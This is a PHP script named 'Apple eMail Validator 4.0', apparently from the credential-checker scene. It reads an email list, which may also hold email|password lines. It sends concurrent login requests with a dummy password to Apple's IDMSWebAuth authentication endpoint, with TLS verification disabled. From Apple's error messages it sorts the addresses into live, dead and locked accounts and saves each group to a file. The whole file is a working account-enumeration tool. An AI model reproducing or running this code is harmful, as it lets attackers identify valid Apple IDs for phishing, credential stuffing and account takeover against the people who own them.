<?php

/**
 * PLEASE DON'T CHANGE THIS
 * Author: Faiz Ainurrofiq (https://paisx.net/)
 * Thanks To: Kahlil Gibran (https://inoob.online/)
 * Link: https://github.com/paisx/
 */
ini_set("memory_limit", '-1');
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

echo banner();
enterlist:
$listname = readline(" Enter list: ");
if(empty($listname) || !file_exists($listname)) {
	echo" [?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline(" Save to dir (default: valid): ");
$dir = empty($savedir) ? "valid" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline(" Request email per second (example: 10 max *30)? ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 3 : $reqemail;
if($reqemail > 30) {
	echo " [*] max 30".PHP_EOL;
	goto reqemail;
}
$delpercheck = readline(" Delete list per check? (y/n): ");
$delpercheck = strtolower($delpercheck) == "y" ? true : false;

$no = 0;
$total = count($lists);
$live = 0;
$dead = 0;
$locked = 0;
$unknown = 0;
$c = 0;

echo PHP_EOL;
$appIdKey	= "3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d";
$scnt = getStr(curl("https://idmsac.apple.com/IDMSWebAuth/login.html?appIdKey=c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80&rv=5&path=/jibe"), "scnt\" name=\"scnt\" value=\"", "\"");
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$data = 'openiForgotInNewWindow=false&fdcBrowserData=%7B%22U%22%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_11_6%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F75.0.3770.90+Safari%2F537.36%22%2C%22L%22%3A%22en-US%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22cWa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflHfk7zl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWodfTPOONRyoEhO3f9p_nH1u_eH3BhxUC550ialT0ial5me1zU0l5yjaY1WMsiZRPrwXC_JEkNgvlE4yy2XElgebiYMpztNKsdKs3Us_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuJpjCBggDUP6qgXK_Pmtd0UbUV8afuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0I.939TrL30L8QVD_DJhCizgzH_y3EjNpmeugSKclr95y.9aB.KB.DJNtG2hiwfxF6ucUTlfe2Reif3gEPv1ZY5BNlr9.NlY5QB4bVNjMk.99.%22%7D&appleId='.$email.'&accountPassword=Jancok123&x=0&y=0&appIdKey='.$appIdKey.'&accNameLocked=false&language=US-EN&rv=4&view=1&requestUri=%2Fauthenticate&Env=PROD&referer=https%3A%2F%2Fwww.google.com%2F&scnt='.$scnt.'&clientInfo=%7B%22U%22%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_11_6%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F75.0.3770.90+Safari%2F537.36%22%2C%22L%22%3A%22en-US%22%2C%22Z%22%3A%22GMT%2B07%3A00%22%2C%22V%22%3A%221.1%22%2C%22F%22%3A%22cWa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt3Q9cUVlOrXTAxw63UYOKES5jfzmkflHfk7zl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWodfTPOONRyoEhO3f9p_nH1u_eH3BhxUC550ialT0ial5me1zU0l5yjaY1WMsiZRPrwXC_JEkNgvlE4yy2XElgebiYMpztNKsdKs3Us_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuJpjCBggDUP6qgXK_Pmtd0UbUV8afuyPBDovJn_JnmccbguaDeyjaY2ftckuyPBDjaY1HGOg3ZLQ0I.939TrL30TptQVD_DJhCizgzH_y3EjNpmeugSKclrurk0JlV1dV0mY697Shr_Ue.zK2vqCSFQ_KpN_WvMNJZNlY5DtF25BNnOVgw24uy.BqK%22%7D';
    $header = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","Accept-Encoding: gzip, deflate, br","Accept-Language: en-US,en;q=0.9","Cache-Control: max-age=0","Connection: keep-alive","Content-Length: ".strlen($data)."","Content-Type: application/x-www-form-urlencoded","Host: idmsac.apple.com","Origin: https://idmsac.apple.com","Referer: https://idmsac.apple.com/IDMSWebAuth/authenticate","Upgrade-Insecure-Requests: 1","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36");
	$rollingCurl->setOptions(array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_ENCODING => "gzip", CURLOPT_COOKIEJAR => dirname(__FILE__)."/../appleval.cook", CURLOPT_COOKIEFILE => dirname(__FILE__)."/../appleval.cook", CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4))->post("https://idmsac.apple.com/IDMSWebAuth/authenticate?email=".$email."&list=".$list, $data, $header);
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $delpercheck, $no, $total, $live, $dead, $locked, $unknown;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = $params["email"];
	$list = $params["list"];
	$x = $request->getResponseText();
	$deletelist = 1;
	$input = "Application has insufficient privileges to perform this action|Your account does not have permission to access this application";
	echo " [".date("H:i:s")." ".$no."/".$total." from ".$listname." to ".$dir."] [ iNoob ] ";
	if(preg_match("#\b(".$input.")\b#", $x)) {
		$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LG"]."LIVE".color()["WH"]." => ".$email;
	// }else if(preg_match("#Your account does not have permission to access this application#", $x)) {
	// 	$live++;
	// 	file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
	// 	echo color()["LG"]."LIVE".color()["WH"]." => ".$email;
	// }
	}else if(preg_match("#Your Apple ID or password was entered incorrectly#", $x)) {
		$dead++;
		file_put_contents("dead.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LR"]."DEAD".color()["WH"]." => ".$email;
	}else if(preg_match("#This Apple ID has been#", $x)) {
		$locked++;
		file_put_contents("locked.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LR"]."LOCKED".color()["WH"]." => ".$email;
	}else{
		$unknown++;
		$deletelist = 0;
		echo color()["LW"]."UNKNOWN".color()["WH"]." => ".$email;
	}
	
	echo color()["LW"]." | ".color()["YL"]."Apple ".color()["CY"]."eMail ".color()["LR"]."Validator 4.0 --".color()["WH"];
	if($delpercheck && $deletelist) {
    	$getfile = file_get_contents("../".$listname);
    	$awal = str_replace("\r", "", $getfile);
    	$akhir = str_replace($list."\n", "", $awal);
    	file_put_contents("../".$listname, $akhir);
	}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
if($delpercheck && count(explode("\n", file_get_contents("../".$listname))) <= 1) unlink("../".$listname);
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Dead: ".$dead." - Locked: ".$locked." - Unknown: ".$unknown.PHP_EOL." Saved to dir \"".$dir."\"".PHP_EOL;

function banner() {
	$out = color()["LW"]."     _____________".color()["MG"]."______________".color()["CY"]."_______________".color()["LM"]."_____________
    |                                                       |
    |           ".color()["LG"]."Apple ".color()["CY"]."eMail ".color()["MG"]."Validator 4.0 --                |
    |  Latest ".color()["LR"]."Update on ".color()["LW"]."Tuesday, ".color()["CY"]."June 04, 2019 at".color()["MG"]." 15:17:21  |
    |      Author: ".color()["LW"]."Faiz Ainurrofiq ".color()["MG"]."(https://paisx.net/)     |
    |_____________".color()["LG"]."______________".color()["CY"]."_______________".color()["MG"]."_____________|".color()["LW"]."
                Made with a cup of ☕ and ❤ --".color()["WH"]."
".color()["WH"].PHP_EOL.PHP_EOL;
	return $out;
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"MG" => (OS == "linux" ? "\e[0;35m" : ""),
		"LM" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : "")
	);
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[1]);
    return $b[0];
}
function curl($url) {
    $ch = curl_init();
    $cookiefile = dirname(__FILE__)."/../appleval.cook";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_FRESH_CONNECT , 0);
	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiefile);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiefile); 
	curl_setopt($ch, CURLOPT_FRESH_CONNECT , 1);
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}
function random_array_value($arrX){
    @$randIndex = array_rand(@$arrX);
    return @$arrX[@$randIndex];
}